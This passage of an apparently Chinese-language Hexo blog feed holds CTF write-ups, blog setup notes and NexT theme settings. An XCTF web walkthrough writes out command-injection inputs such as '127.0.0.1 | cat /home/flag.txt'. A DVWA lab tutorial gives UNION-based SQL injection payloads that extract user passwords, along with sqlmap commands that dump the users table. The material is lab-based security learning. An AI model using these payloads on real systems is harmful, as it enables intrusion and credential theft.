class="line">rypqfawawsbqf</span><br><span class="line">xxywvsaxdcswz</span><br><span class="line">mpbxbbojczxed</span><br><span class="line"><span class="keyword">jlxygkigvqqrr</span></span><br><span class="line"><span class="keyword">qoiitjkdrkytu</span></span><br><span class="line"><span class="keyword">oczhydzljeips</span></span><br><span class="line"><span class="keyword">ykufhfgullzol</span></span><br><span class="line"><span class="keyword">hblrnhjbxmmio</span></span><br><span class="line"><span class="keyword">gdvlugxvkxjuq</span></span><br><span class="line"><span class="keyword">vmkamlpiiywyx</span></span><br><span class="line"><span class="keyword">sambkvlqsiaav</span></span><br><span class="line"><span class="keyword">fireinthehole</span></span><br><span class="line"><span class="keyword">uzaulcdkfprst</span></span><br><span class="line"><span class="keyword">wvfoomsyaupka</span></span><br><span class="line"><span class="keyword">irdtpxrppdldm</span></span><br><span class="line"><span class="keyword">kncsjzfnmnnjk</span></span><br><span class="line"><span class="keyword">psegzphtyadfg</span></span><br><span class="line"><span class="keyword">bjojqqecgjvhh</span></span><br><span class="line"><span class="keyword">eunvaonrhfhgi</span></span><br><span class="line"><span class="keyword">lwjdwwymbbgmw</span></span><br></pre></td></tr></table></figure><p>发现就<strong>fireinthehole</strong>是个可读的字符串</p><h2 id="9-easy-ECC"><a href="#9-easy-ECC" class="headerlink" title="9. easy_ECC"></a>9. easy_ECC</h2><p>是的,我不会</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xctf-crypto-新手练习区&quot;&gt;&lt;a href=&quot;#xctf-crypto-新手练习区&quot; class=&quot;headerlink&quot; title=&quot;xctf-crypto-新手练习区&quot;&gt;&lt;/a&gt;xctf-crypto-新手练习区&lt;/h1&gt;&lt;h2 id=&quot;1-bas
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/categories/ctf/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="ctf" scheme="https://mercer5.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>xctf-web-新手练习区</title>
    <link href="https://mercer5.github.io/2020/08/25/xctf-web-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://mercer5.github.io/2020/08/25/xctf-web-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-08-25T00:37:15.000Z</published>
    <updated>2020-08-25T00:39:44.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xctf-web-新手练习区"><a href="#xctf-web-新手练习区" class="headerlink" title="xctf-web-新手练习区"></a>xctf-web-新手练习区</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p><img src="image-20200716153232985.png" alt="image-20200716153232985"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p><img src="image-20200716153348036.png" alt="image-20200716153348036"></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><blockquote><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p></blockquote><p><img src="image-20200716153539061.png" alt="image-20200716153539061"></p><p><img src="image-20200716153602077.png" alt="image-20200716153602077"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><blockquote><p>php的备份有两种：.php~和.php.bak</p></blockquote><p><img src="image-20200716154007563.png" alt="image-20200716154007563"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p><img src="image-20200716154154950.png" alt="image-20200716154154950"></p><p><img src="image-20200716154219258.png" alt="image-20200716154219258"></p><p><img src="image-20200716154236015.png" alt="image-20200716154236015"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p><img src="image-20200716154347970.png" alt="image-20200716154347970"></p><p>删了下划内容</p><p><img src="image-20200716154418626.png" alt="image-20200716154418626"></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>爆破</p><p>123456</p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><blockquote><p>| 的作用为将前一个命令的结果传递给后一个命令作为输入</p><p>&amp;&amp;的作用是前一条命令执行成功时，才执行后一条命令</p><p><img src="image-20200716155604029.png" alt="image-20200716155604029"></p></blockquote><ol><li><p>输入<code>127.0.0.1 |  find / -name &quot;flag.txt&quot;</code></p><p><img src="image-20200716155446460.png" alt="image-20200716155446460"></p></li><li><p>输入<code>127.0.0.1 |  cat /home/flag.txt</code></p><p><img src="image-20200716155526247.png" alt="image-20200716155526247"></p></li></ol><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p><img src="image-20200716155940510.png" alt="image-20200716155940510"></p><ol><li><p><code>a==0 &amp;&amp; a 存在</code>: <strong>php弱类型</strong></p></li><li><p><code>is_numeric</code>:检测变量是否为数字或数字字符串 </p><p>所以b不是数字或数字字符串但&gt;1234</p><p><strong>php弱类型比较</strong></p><p>可用<code>9999</code>+<code>任意字符</code></p></li></ol><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><blockquote><p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p></blockquote><p><img src="image-20200716161916503.png" alt="image-20200716161916503"></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>蚁剑/菜刀</p><p><img src="image-20200716162150632.png" alt="image-20200716162150632"></p><p><img src="image-20200716162232973.png" alt="image-20200716162232973"></p><p><img src="image-20200716162240177.png" alt="image-20200716162240177"></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>1.打开页面，查看源代码，可以发现js代码，如图所示。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/simple_js/1.png" alt="img"></p><p>2.进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 fromCharCode 。</p><p>3.先将字符串用python处理一下，得到数组[55,56,54,79,115,69,114,116,107,49,50]，exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure><p>4.将得到的数字分别进行ascii处理，可得到字符串786OsErtk12，exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b = chr(i)</span><br><span class="line">    c = c + b</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>5.规范flag格式，可得到Cyberpeace{786OsErtk12}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xctf-web-新手练习区&quot;&gt;&lt;a href=&quot;#xctf-web-新手练习区&quot; class=&quot;headerlink&quot; title=&quot;xctf-web-新手练习区&quot;&gt;&lt;/a&gt;xctf-web-新手练习区&lt;/h1&gt;&lt;h2 id=&quot;view-source&quot;&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/categories/ctf/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="ctf" scheme="https://mercer5.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>换台电脑搞blog</title>
    <link href="https://mercer5.github.io/2020/08/25/%E6%8D%A2%E5%8F%B0%E7%94%B5%E8%84%91%E6%90%9Eblog/"/>
    <id>https://mercer5.github.io/2020/08/25/%E6%8D%A2%E5%8F%B0%E7%94%B5%E8%84%91%E6%90%9Eblog/</id>
    <published>2020-08-25T00:31:35.000Z</published>
    <updated>2020-08-25T00:34:47.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="换台电脑搞blog"><a href="#换台电脑搞blog" class="headerlink" title="换台电脑搞blog"></a>换台电脑搞blog</h1><blockquote><p>很好,之前的预言中了,电脑重装后,啥都没了</p><p>从现在开始重新搭建blog所需的环境之类的东西</p><p>顺便记录一下,恢复过程</p><p>2020-8-24</p></blockquote><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ol><li>git</li><li>nodejs</li></ol><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><ul><li>设置git全局邮箱和用户名</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"yourgithubname"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"yourgithubemail"</span></span><br></pre></td></tr></table></figure><ul><li>设置ssh key</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail"</span></span><br><span class="line"><span class="meta">#生成后填到github</span></span><br></pre></td></tr></table></figure><ul><li>安装hexo</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><p>但是已经不需要初始化了，</p><p>直接在任意文件夹下，</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">git</span>@………………</span><br></pre></td></tr></table></figure><p>然后进入克隆到的文件夹：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cd</span> <span class="selector-tag">xxx</span><span class="selector-class">.github</span><span class="selector-class">.io</span></span><br><span class="line"><span class="selector-tag">npm</span> <span class="selector-tag">install</span> <span class="selector-tag">hexo-deployer-git</span> <span class="selector-tag">--save</span></span><br></pre></td></tr></table></figure><p>生成，部署：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><p>然后就可以开始写你的新博客了</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> newpage</span><br></pre></td></tr></table></figure><p>不要忘了，每次写完最好都把源文件上传一下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit –m <span class="string">"xxxx"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;换台电脑搞blog&quot;&gt;&lt;a href=&quot;#换台电脑搞blog&quot; class=&quot;headerlink&quot; title=&quot;换台电脑搞blog&quot;&gt;&lt;/a&gt;换台电脑搞blog&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;很好,之前的预言中了,电脑重装后,啥都没了&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-sql-显注-low</title>
    <link href="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/"/>
    <id>https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/</id>
    <published>2020-04-15T09:38:31.000Z</published>
    <updated>2022-01-06T08:23:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa-sql-显注-low"><a href="#dvwa-sql-显注-low" class="headerlink" title="dvwa-sql-显注-low"></a>dvwa-sql-显注-low</h1><blockquote><p>就拿dvwa学习一下sql的手工注入,以及sqlmap的使用</p><p>做些笔记</p></blockquote><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><ol><li><p>concat_ws(1,2,3): 使用1作为连接符,连接2和3</p><p>方便从一个显示位,显示多种内容</p></li><li><p>char(32,58,32): char将其中的ascii值转成字符</p><p>这里是空格冒号空格</p><p>作为concat_ws使用,比较美观</p></li></ol><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ol><li><p>输入<code>&#39;</code>,发现有报错,说明很可能有sql注入</p></li><li><p><code>1&#39; order by 2#</code>猜解列数</p><p>order by后面加数字时,表示按第几列进行排序</p><p>如果没有那列的话,就会报错</p><p>该步的目的,是为了使用union select</p><p>因为union select 要求两者的列数相同,才能进行查询</p><p><img src="Snipaste_2020-04-15_10-48-47.png" alt="Snipaste_2020-04-15_10-48-47"></p><p><img src="Snipaste_2020-04-15_10-48-55.png" alt="Snipaste_2020-04-15_10-48-55"></p></li><li><p><code>1&#39; union select 1,2#</code>爆显示位</p><p>从输入中,可以发现,两个都能显示出来</p><p>也就是说,每次可以查询两个地方</p><p><img src="Snipaste_2020-04-15_10-51-10.png" alt="Snipaste_2020-04-15_10-51-10"></p></li><li><p><code>1&#39; union select version(),database()#</code></p><p>查询一下sql版本和当前数据库名称</p><p>sql版本很重要,因为版本&gt;(多少我忘了&gt;&lt;)时,会有一个<code>information_schema</code>数据库,里面有好多好多好东西</p><p><img src="Snipaste_2020-04-15_10-47-58.png" alt="Snipaste_2020-04-15_10-47-58"></p><p><code>1&#39; union select null,concat_ws(char(32,58,32),user(),database(),version())#</code></p><p>另一种方法,会在第二个显示位一起爆出用户、数据库及其版本信息</p><p><img src="Snipaste_2020-04-15_16-23-32.png" alt="Snipaste_2020-04-15_16-23-32"></p></li><li><p><code>1&#39; union select null,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p><p>版本比较大,所以有<code>information_schema</code>;得知数据库名后,就可以查表了</p><p><img src="Snipaste_2020-04-15_16-27-26.png" alt="Snipaste_2020-04-15_16-27-26"></p><p>可以看出dvwa中有两个表<code>guestbook</code>and<code>users</code></p><p>明显users重要点,所以下一步查users的列</p></li><li><p><code>1&#39; union select null,group_concat(column_name) from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-38-54.png" alt="Snipaste_2020-04-15_16-38-54"></p><p>其中<code>user</code>和<code>password</code>看起来比较重要</p></li><li><p><code>1&#39; union select null, group_concat(concat_ws(char(32,58,32),user,password)) from users #</code></p><p><img src="Snipaste_2020-04-15_16-43-02.png" alt="Snipaste_2020-04-15_16-43-02"></p></li><li><p>如果不想显示在一条上,而是分开查询的话,把group_concat删了就行</p><ul><li><p>查表</p><p><code>1&#39; union select null,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-46-11.png" alt="Snipaste_2020-04-15_16-46-11"></p></li><li><p>查列</p><p><code>1&#39; union select null,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-46-27.png" alt="Snipaste_2020-04-15_16-46-27"></p></li><li><p>查内容</p><p><code>1&#39; union select null, concat_ws(char(32,58,32),user,password) from users #</code></p><p><img src="Snipaste_2020-04-15_16-46-37.png" alt="Snipaste_2020-04-15_16-46-37"></p></li></ul></li></ol><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><ol><li><p>准备好网址</p><p>在id中输入1,是的url中包含参数名称</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/sqli/</span>?id=<span class="number">1</span>&amp;Submit=Submit<span class="comment">#</span></span><br></pre></td></tr></table></figure></li><li><p>准备好cookie</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">security</span>=low; <span class="attribute">PHPSESSID</span>=9v0e6li5s4iok70h3fi7al0gv1</span><br></pre></td></tr></table></figure></li><li><p>打开sqlmap,输入</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure><p>康康有没有sql注入</p><ul><li>-u参数指定目标URL</li><li>—batch参数采用默认选项,不进行询问</li><li>—cookie参数指定cookie</li></ul><p>可以看到是存在注入的</p><p><img src="Snipaste_2020-04-15_17-13-57.png" alt="Snipaste_2020-04-15_17-13-57"></p></li><li><p>查看所有的数据库</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure><ul><li>—dbs所有数据库</li></ul><p><img src="Snipaste_2020-04-15_17-15-16.png" alt="Snipaste_2020-04-15_17-15-16"></p></li><li><p>所以我们要用的应该是dvwa那个库,然后康康里面有什么表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> -D dvwa <span class="params">--tables</span></span><br></pre></td></tr></table></figure><ul><li>-D参数指定为dvwa数据库</li><li>—tables参数查看所有的表</li></ul><p><img src="image-20200415171817802.png" alt="image-20200415171817802"></p></li><li><p>查看users表中的列</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--columns</span><br></pre></td></tr></table></figure><ul><li>-T参数指定表为users</li><li>—columns查看该表的所有列</li></ul><p><img src="image-20200415172014493.png" alt="image-20200415172014493"></p></li><li><p>最后看看整个表中都有什么</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--dump</span><br></pre></td></tr></table></figure><ul><li>—dump参数将所有列的信息都列出来</li></ul><p><img src="image-20200415172329770.png" alt="image-20200415172329770"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa-sql-显注-low&quot;&gt;&lt;a href=&quot;#dvwa-sql-显注-low&quot; class=&quot;headerlink&quot; title=&quot;dvwa-sql-显注-low&quot;&gt;&lt;/a&gt;dvwa-sql-显注-low&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;就拿dvw
      
    
    </summary>
    
    
      <category term="sql" scheme="https://mercer5.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://mercer5.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>next主题配置</title>
    <link href="https://mercer5.github.io/2020/04/08/next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    <id>https://mercer5.github.io/2020/04/08/next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/</id>
    <published>2020-04-08T05:54:40.000Z</published>
    <updated>2020-08-24T15:30:09.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="next主题配置"><a href="#next主题配置" class="headerlink" title="next主题配置"></a>next主题配置</h1><h2 id="Scheme"><a href="#Scheme" class="headerlink" title="Scheme"></a>Scheme</h2><p>外观</p><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><p>Scheme 的切换通过更改 <strong>主题配置文件</strong>，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释符号去除即可。</p><p>eg:选择 Pisces Scheme</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#scheme: Muse</span></span><br><span class="line"><span class="meta">#scheme: Mist</span></span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><h2 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h2><p>编辑 <strong>站点配置文件</strong>， 将 <code>language</code> 设置成你所需要的语言。建议明确设置你所需要的语言，例如选用简体中文，配置如下：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">language:</span> <span class="built_in">zh</span>-Hans</span><br></pre></td></tr></table></figure><p>目前支持的语言有</p><div class="table-container"><table><thead><tr><th style="text-align:left">语言</th><th style="text-align:left">代码</th><th style="text-align:left">设定示例</th></tr></thead><tbody><tr><td style="text-align:left">English</td><td style="text-align:left"><code>en</code></td><td style="text-align:left"><code>language: en</code></td></tr><tr><td style="text-align:left">简体中文</td><td style="text-align:left"><code>zh-Hans</code></td><td style="text-align:left"><code>language: zh-Hans</code></td></tr><tr><td style="text-align:left">Français</td><td style="text-align:left"><code>fr-FR</code></td><td style="text-align:left"><code>language: fr-FR</code></td></tr><tr><td style="text-align:left">Português</td><td style="text-align:left"><code>pt</code></td><td style="text-align:left"><code>language: pt</code> or <code>language: pt-BR</code></td></tr><tr><td style="text-align:left">繁體中文</td><td style="text-align:left"><code>zh-hk</code> 或者 <code>zh-tw</code></td><td style="text-align:left"><code>language: zh-hk</code></td></tr><tr><td style="text-align:left">Русский язык</td><td style="text-align:left"><code>ru</code></td><td style="text-align:left"><code>language: ru</code></td></tr><tr><td style="text-align:left">Deutsch</td><td style="text-align:left"><code>de</code></td><td style="text-align:left"><code>language: de</code></td></tr><tr><td style="text-align:left">日本語</td><td style="text-align:left"><code>ja</code></td><td style="text-align:left"><code>language: ja</code></td></tr><tr><td style="text-align:left">Indonesian</td><td style="text-align:left"><code>id</code></td><td style="text-align:left"><code>language: id</code></td></tr><tr><td style="text-align:left">Korean</td><td style="text-align:left"><code>ko</code></td><td style="text-align:left"><code>language: ko</code></td></tr></tbody></table></div><h2 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h2><p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标。 NexT 使用的是 <a href="http://fontawesome.io/" target="_blank" rel="noopener">Font Awesome</a> 提供的图标</p><p>编辑 <strong>主题配置文件</strong>，修改以下内容：</p><ol><li><p>设定菜单内容，对应的字段是 <code>menu</code>。 菜单内容的设置格式是：<code>item name: link || icon_name</code>。其中 <code>item name</code>是一个名称，这个名称并不直接显示在页面上，她将用于匹配图标以及翻译;icon_name是<strong>font awesome</strong> 的图标名</p><p><strong>这里有一个问题,就是有图标名就没法进入正确的网页;必须把||及后面的删掉才行</strong></p><p>菜单示例配置</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> / </span><br><span class="line">  <span class="meta">#about: /about/ </span></span><br><span class="line"><span class="symbol">  tags:</span> <span class="meta-keyword">/tags/</span> </span><br><span class="line"><span class="symbol">  categories:</span> <span class="meta-keyword">/categories/</span> </span><br><span class="line"><span class="symbol">  archives:</span> <span class="meta-keyword">/archives/</span> </span><br><span class="line">  <span class="meta">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="meta">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="meta">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure><p>除了 <code>home</code>， <code>archives</code> , <code>/</code>后面都需要手动创建这个页面</p><p>NexT 默认的菜单项有（标注 的项表示需要手动创建这个页面）：</p><p>| 键值       | 设定值                    | 显示文本（简体中文） |<br>| :————- | :———————————— | :—————————- |<br>| home       | <code>home: /</code>                 | 主页                 |<br>| archives   | <code>archives: /archives</code>     | 归档页               |<br>| categories | <code>categories: /categories</code> | 分类页               |<br>| tags       | <code>tags: /tags</code>             | 标签页               |<br>| about      | <code>about: /about</code>           | 关于页面             |<br>| commonweal | <code>commonweal: /404.html</code>   | 公益 404             |</p></li><li><p>设置菜单项的显示文本。在第一步中设置的菜单的名称并不直接用于界面上的展示。Hexo 在生成的时候将使用 这个名称查找对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/{language}.yml</code> （<code>{language}</code> 